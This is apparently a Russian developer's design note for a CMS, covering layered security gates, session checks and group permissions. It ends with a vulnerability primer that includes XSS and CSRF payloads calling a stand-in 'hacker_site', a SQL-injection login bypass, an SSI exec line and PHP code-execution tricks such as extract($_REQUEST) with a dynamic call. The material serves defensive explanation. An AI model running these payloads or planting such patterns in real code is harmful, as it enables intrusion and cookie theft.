# Уровни защиты

В системе применяется несколько уровней защиты. Они следуют друг за другом. После прохождения каждого уровня система загружает следующие компоненты и переходит к следующему уровню проверки.

Такая реализация получила внутреннее название гейты безопасности, а каждый уровень защиты называется гейт.

Последовательность гейтов неизменна, т.к. она зависит от последовательности загрузки компонентов системы. Но через настройки можно выключить тот или иной гейт, тогда проверки безопасности не будет, а система загрузит очередные компоненты сразу.

1й гейт отвечает за проверку системы - это определение необходимых функций, констант, а также версии системы. Все это определяется ДО прохождения первого гейта.

2й гейт отвечает за определение источника запроса к системе - внешний или внутренний, разрешенный или нет. Гейт отбрасывает только запрещенные внешние запросы, остальные пропускает.

3й гейт - блокировка по ip. Проверка осуществляется по черному или белому списку адресов. Поддерживаются как ip4, так и ip6, одиночные адреса и диапазоны через тире, звездочку и в формате CIDR. Для работы этого гейта подгружаются фунции обработки ip адресов.

4й гейт - проверка на вызов ошибки. Если сайт был загружен с данными об ошибке, то система ведет ее обработку, а затем перенаправляет на шаблон. Никакие другие функции и данные не загружаются.

5й гейт встроен в обработчик путей. Если путь не соответствует определенным требованиям (это как системные условия, так и пользовательские настройки), то система перезагружается с обработанным правильным путем, либо вызывает ошибку. В ряде случаев она перенаправляет на доп.обработчик, но это касается служебного динамического контента.

6й гейт устанавливает и проверяет куки и сессию.

Между 6м и 7м гейтами идет загрузка множества компонентов, но все они необходимы, т.к. далее следует работа с базой данных.

7й гейт осуществляет проверку пользователя по базе данных с назначением ему прав.

После 7го гейта идет загрузка оставшихся компонентов системы. Также, если пользователь получил определенные права, активируется разрешение на запись в базу данных. Пока этот момент не реализован, но скорее всего он будет осуществлен через константу.

8й гейт осуществляет проверку запросов и перенаправление на процессор.

После этого инициализация системы считается завершенной и система переходит непосредственно к загрузке сайта.

# Принципы работы гейтов

6й гейт.

Когда пользователь заполняет форму авторизации/регистрации, его браузер отправляет серверу запрос.

Сервер принимает этот запрос и начинает проходить гейты. Данный гейт его пропускает, потому что на тот момент пользователю еще не назначены идентификационные куки.

В результате сервер пропускает пользователя до процессора, который приступает к обработке запроса авторизации/регистрации.

Если запрос завершился успешно, стартуется сессия, пользователь получает куки и сервер перезапускает систему.

Здесь есть еще один важный момент. При авторизации/регистрации пользователя сессии назначается специальный триггер 'allow', который условно показывает, что сессия была начата.

При новом запуске уже никакого запроса нет, но есть идентификационные куки. Данный гейт останавливает пользователя и начинает проверку кук, идентификатора сессии и триггера.

Если либо идентификатора, либо кук нет, или они поддельные, система выдает ошибку. Здесь также проверяется источник запроса, т.к. этот запрос должен поступать только от системы.

Если время сессии вышло, то все идентификаторы обновляются. Однако при этом проверяется триггер 'allow', и если он не установлен, то сессия закрывается, все ее данные и куки удаляются, а система выдает ошибку. Дело в том, что триггер 'allow' записывается не в куки, а в сессию и его практически невозможно подделать.

Однако теоретически остается возможность перехватить сессию - если будут похищены куки и выполнение запроса будет происходить с того же ip-адреса и с того же браузера. Однако при этом похитителю сложно будет выполнять запросы, т.к. их источник тоже нужно будет подделать.

Если же кто-то попытается похитить сессию и допустит ошибку, сессия будет сброшена, атакуемого выкинет из аккаунта, а необходимая служебная информация запишется в логи.

# Права пользователей

Права пользователей назначаются по группам. Т.е. сначала вам нужно создать группу с определенными правами. Если вы хотите каждому пользователю создать индивидуальные права, вам придется создать свою группу для каждого. Хотя это, скорее всего, не потребуется, потому что права имеют гибкие настройки.

Когда группа создана, вы просто назначаете ее пользователю. Один пользователь может входить в несколько групп.

Так, у пользователя есть следующая информация:

	id, name, data

Вся остальная информация хранится в данных (data). Какая именно информация будет записана для пользователя, настраивается системой. Для этого используется таблица "userstable", где указаны поля и формат каждого поля.

Например:

	"login" : {
		"type" : "",
		"validation" : "",
		"unique" : true,
		"required" : true,
		"authorise" : true,
		"secure" : true,
		"crypt" : false,
		"readonly" : true
	}

Эта запись идентична такой записи в таблице:

	id | name  | type | cdate | mdate | rights | data
	0    login                                   { "type" : "", "validation" : "", "unique" : true, "required" : true, "authorise" : true, "secure" : true, "crypt" : false, "readonly" : true }

Значит, у пользователя в данных должно быть поле "login", оно обязательное, уникальное (т.е. не повторяющаяся у других), его тип - по-умолчанию, без проверки, оно используется для авторизации, оно защищено, не закриптовано и только для чтения

Таким образом можно задать целое множество полей, любых каких нужно. Однако в системе есть предопределенные типы полей. На данный момент это:

	datetime - дата в абсолютном формате (напр. 1568807468)
	date - дата в формате, заданном системой (напр. 18.09.2019)
	time - время в формате, заданном системой (напр. 11:51:08)
	text - текстовое поле, оно же по-умолчанию

	дополнительные поля:
	cdate - дата создания, в абсолютном формате
	mdate - дата последнего изменения, в абсолютном формате
	rights - список допустимых пользователей / для пользователя - группа прав

id.name[.ext] + create_date + modify_date + size + data

# Права групп

Права определяются по следующим видам доступа:

	deny/false [0] - нет доступа
	read [r] - чтение
	self [s] - чтение всех записей, но изменение только той, которая закреплена за тобой
	write [w] - запись или изменение существующей записи
	add [a] - добавление новой записи
	delete [d] - удаление существующей записи
	allow/true [1] - все права

Стоит заметить, что права распределены в порядке возрастания уровня доступа. Это значит, что каждый следующий уровень разрешает предыдущий, если он не был задан отдельно. Так права "self" автоматически включает права "read", права "write" - "self" и "read" и т.д. Если вы хотите управлять правами более гибко, прописывайте разрешения для каждого из них.

Для структуры права будут выставляться согласно названию разделов. Здесь будет только два правила - разрешено и запрещено:

	"structure" : {
		"administrator" : {
			"panel"     : true
		},
		"editor:allow"  : {
			"create"    : false
		},
		"private"       : false
	}

Как видите, можно запрещать доступ к любому разделу или подразделу. При этом он попросту будет исключен из структуры, а значит не попадет в меню и в роутер. Исключение из роутера означает, что даже если пользователь запросит эту страницу, ему будет отказано в доступе.

В случае с "private" доступ запрещен ко всему разделу, включая подразделы.
В случае с "administrator" доступ запрещен не всему разделу, но ко всем подразделам, исключая подраздел "panel".
В случае с "editor" стоит параметр "allow", который разрешает доступ ко всем подразделам, за исключением указанных, например подраздел "create" запрещен.

Доступ к подразделам можно указывать по-разному. Так, например, никто не запрещает запрещать подразделы в запрещенном разделе или наоборот, разрешать подразделы в разрешенном разделе. Просто такая запись будет бессмысленной, да к тому же будет загружать систему лишней обработкой.

Помимо структуры, права назначаются разделам базы данных.

	"rights" : {
		"languages" : true,
		"users"     : "write:field1:field2"
	}

В данном случае пользователю разрешен доступ только к двум разделам базы данных - "languages" и "users". Причем к разделу "languages" дан полный доступ, а к разделу "users" - доступ только на запись, т.е. на изменение данных, без возможности добавления новых или удаления старых. К тому же, запись разрешена только в полях "field1" и "field2", все остальные поля изменять нельзя.

Можно ли комбинировать права, например read и write? Можно. Вот пример:

	"rights" : {
		"languages" : true,
		"users"     : "write:field1:field2 read:field3"
	}

Такая запись будет преобразована в следующий объект:

	$user : {
		"rights" : {
			"languages" : {
				"read" : true,
				"self" : true,
				"write" : true,
				"delete" : true,
				"add" : true
			},
			"users" : {
				"read" : ["field3"],
				"self" : true,
				"write" : ["field1", "field2"],
				"delete" : false,
				"add" : false
			}
		}
	};

Подобные правила распространяются на контент:

	"rights" : {
		"content" : {
			"news"     : "read",
			"articles" : "self"
		}
	}

Право "self" на самом деле идентично правилу "write", но только для тех записей, в которых указана привязка к id пользователя. Кстати, не надо путать id пользователя с uid или логином. Id пользователя записывается в базе данных при регистрации, генерируется случайным образом как производное от нескольких данных. По имени пользователя name идет авторизация, но по своему id пользователь получает права доступа.

# Уровни защиты

Высокая безопасность подразумевает множественные проверки, что снижает скорость загрузки сайта и повышает нагрузку на сервер.

Тем более, что проверяться будет каждое обращение, каждый запрос, загрузка каждой страницы.

Поэтому в системе установлено несколько уровней защиты.

# Обычный уровень защиты

Здесь считается, что 

# Параноидальный уровень защиты

# Уровень защиты от DDOS-атак и при DDOS-атаках

# Блокировка по ip

Специальная секция блокировки ip в конфигурационных файлах сервера

Файл blacklist или blockip со списком заблокированных адресов в папке admin - их обрабатывает система, что в ряде случаев является лучшим вариантом, т.к. сервер почему-то не всегда справляется с блокировкой, особенно если идет блокировка по диапазону

# Сервисы для проверки:

Sucuri SiteCheck https://sitecheck.sucuri.net/
Google Safe Browsing https://transparencyreport.google.com/safe-browsing/search
Quttera http://quttera.com/
Web Inspector https://www.webinspector.com/
urlquery URL Scanner https://urlquery.net/
Norton Safe Web https://safeweb.norton.com/
VirusTotal https://www.virustotal.com/

Malware Domain List
PhishTank
Comodo

XSS (Cross-Site Scripting) - это вид уязвимости программного обеспечения (Web приложений), при которой, на генерированной сервером странице, выполняются вредоносные скрипты, с целью атаки клиента.
XSRF / CSRF (Request Forgery) - это вид уязвимости, позволяющий использовать недостатки HTTP протокола, при этом злоумышленники работают по следующей схеме: ссылка на вредоносный сайт установливается на странице, пользующейся доверием у пользователя, при переходе по вредоносной ссылке выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо изменяет доступ к учетной записи пользователя, для получения полного контроля над ней.
Code injections (SQL, PHP, ASP и т.д.) - это вид уязвимости, при котором становится возможно осуществить запуск исполняемого кода с целью получения доступа к системным ресурсам, несанкционированного доступа к данным либо выведения системы из строя.
Server-Side Includes (SSI) Injection - это вид уязвимости, использующий вставку серверных команд в HTML код или запуск их напрямую с сервера.
Authorization Bypass - это вид уязвимости, при котором возможно получить несанкционированный доступ к учетной записи или документам другого пользователя

# XSS

<script>alert(document.cookie);</script>
<script>window.parent.location.href='http://hacker_site';</script>
<object type="text/x-scriptlet" data="http://hacker_site"></object>

# XSRF / CSRF (Request Forgery)

Наиболее частыми CSRF атаками являются атаки использующие HTML <IMG> тэг или Javascript объект image. Чаще всего атакующий добавляет необходимый код в электронное письмо или выкладывает на веб-сайт, таким образом, что при загрузке страницы осуществляется запрос, выполняющий вредоносный код. Примеры:

IMG SRC
<img src="http://hacker_site/?command">

SCRIPT SRC
<script src="http://hacker_site/?command">

Javascript объект Image
<script>
           var foo = new Image();
           foo.src = "http://hacker_site/?command";
</script>

# Code injections (SQL, PHP, ASP и т.д.)

Вставки исполняемого кода рассмотрим на примере кода SQL. Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе данных через выполнение SQL запроса:

SELECT Username
FROM Users
WHERE Name = 'tester'
AND Password = 'testpass';

Вводим корректное имя ’tester’, а в поле пароль вводим строку:

testpass' OR '1'='1

В итоге, Если поле не имеет соответствующих валидаций или обработчиков данных, может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему, т.к.SQL запрос примет следующий вид:

SELECT Username
FROM Users
WHERE Name = 'tester'
AND Password = 'testpass' OR '1'='1';

Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет возвращать много значений.

# Server-Side Includes (SSI) Injection

В зависимости от типа операционной системы команды могут быть разными, как пример рассмотрим команду, которая выводит на экран список файлов в OS Linux:

< !--#exec cmd="ls" -->

# Authorization Bypass

Пользователь А может получить доступ к документам пользователя Б. Допустим, есть реализация, где при просмотре своего профиля, содержащего конфеденциальную информацию, в URL страницы передается userID, а данном случае есть смысл попробовать подставить вместо своего userID номер другого пользователя. И если вы увидите его данные, значит вы нашли дефект.

# Вариант 1: косвенный вызов функции

<?php 
    $a = "var_dump";
    $b = "Test";
    $a($b);
?>

# Вариант 2: выполнение кода через eval

<?php
  eval('$a = "Test"; echo $a;');
?>

# Вариант 3: выполнение кода через assert

<?php
  assert('print("Test")');
?>

# Вариант 4: выполнение кода через array_map

<?php
  function evil($a) {
    echo $a;
  }
  array_map('evil', array("Test"));
?>

# Вариант 5: выполнение кода через preg_replace('/.*/e')

<?php
  preg_replace('/.*/e', 'print("Test")', '');
?>

# Вариант 6: выполнение кода через preg_replace_callback

<?php
  $a = function () { echo "Test"; };
  preg_replace_callback('/.*/', $a, ''); 
?>

# Вариант 7: выполнение кода через usort, uasort, uksort

<?php
  $a = function ($x, $y) { echo "Test"; };
  $b = array(1 => '1', 2 => '2');
  usort( $b, $a);
?>

# Вариант 8: скрытое объявление функций и передача параметров через extract

<?php
   extract($_REQUEST);
   $a($b);
?>

